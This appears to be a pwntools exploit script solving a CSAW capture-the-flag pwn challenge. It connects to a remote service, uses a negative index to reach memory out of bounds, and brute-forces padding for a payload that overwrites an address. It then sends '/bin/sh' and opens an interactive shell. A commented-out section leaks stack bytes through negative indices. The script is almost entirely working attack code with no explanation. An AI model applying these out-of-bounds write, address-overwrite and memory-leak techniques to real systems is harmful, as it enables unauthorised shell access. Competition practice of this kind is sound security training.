from pwn import *




for i in range(13):
    try:
        io = remote("pwn.red.csaw.io", 5010)

        print(io.recv())
        io.sendline("1")
        print(io.recv())
        io.sendline("AAAAAAAA")
        print(io.recv())
        io.sendline("3")

        print(io.recv())

        io.sendline("-4")

        print(io.recv())

        payload = "\x00" * i + "\x30\xb8\x40\x00\x00\x00\x00\x00\x00"

        io.sendline(payload)

        print(io.recv())

        io.sendline("/bin/sh")

        io.interactive()
    except:
        continue

'''
io.recv()

io.sendline("2")

io.recv()

for i in range(-2, -20, -1):

    io.sendline(str(i))

    got_unformatted = io.recv()

    #print(got_unformatted.decode("latin1"))
    try:
        leek_bytes = ''.join(f"0x{j:02x}" for j in got_unformatted).split("0x0a")

        del leek_bytes[0:3]


        leek_bytes[0] = leek_bytes[0][58:]
        for a in range(7): 
            leek_bytes[a+1] = leek_bytes[a+1][58:]
        del leek_bytes[8:]
      
       
        print(" ".join(leek_bytes).replace("0x", " ").strip(" "), end=" ")

    except:
        print("\nhaha lol no bad try again")


    io.sendline("2")
    io.recv()


'''
